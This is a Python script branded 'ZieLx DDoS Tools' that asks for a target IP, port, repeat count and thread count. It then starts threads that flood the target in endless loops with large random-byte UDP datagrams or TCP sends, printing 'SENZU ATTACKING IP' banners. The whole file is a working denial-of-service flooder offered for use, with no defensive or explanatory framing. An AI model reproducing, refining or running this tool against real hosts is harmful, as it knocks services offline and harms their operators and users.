import socket
import socks
import threading
import random
import re
import urllib.request
import os
import sys
import random
import socket
import threading
import time
from time import sleep

os.system("clear")


print("\033[92m▓█████▄ ▓█████▄  ▒█████    ██████ ") 
print("\033[92m▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ ") 
print("\033[92m░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   ") 
print("\033[92m░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒ ") 
print("\033[92m░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒ ") 
print("\033[92m ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░ ") 
print("\033[92m ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░ ") 
print()
print("\033[92m>>>   ZieLx DDoS Tools   <<<") 
ip = str(input("[+] Ip/Host : => "))
port = int(input("[-] Port : => "))
choice = str(input("[+] Ready?? (y/n) : => "))
times = int(input("[-] Times : => "))
threads = int(input("[+] Threads : => "))
os.system("clear")
def ddos():
	data = random._urandom(65500)
	i = random.choice(("[-]","[•]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\u001b[31m SENZU ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			print("\u001b[31m[×] SENZU ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))


def ddos2():
	data = random._urandom(2048)
	i = random.choice(("[-]","[•]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m SENZU ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			choice = str(input(" GAS?? [ y / n ] :"))


def ddos3():
	data = random._urandom(1025)
	i = random.choice(("[-]","[•]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m Senzu ATTACKING TO\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[×] Senzu ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))


for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = ddos)
		th.start()
		th = threading.Thread(target = ddos2)
		th.start()
	else:
	    th = threading.Thread(target = ddos3)
	    th.start()
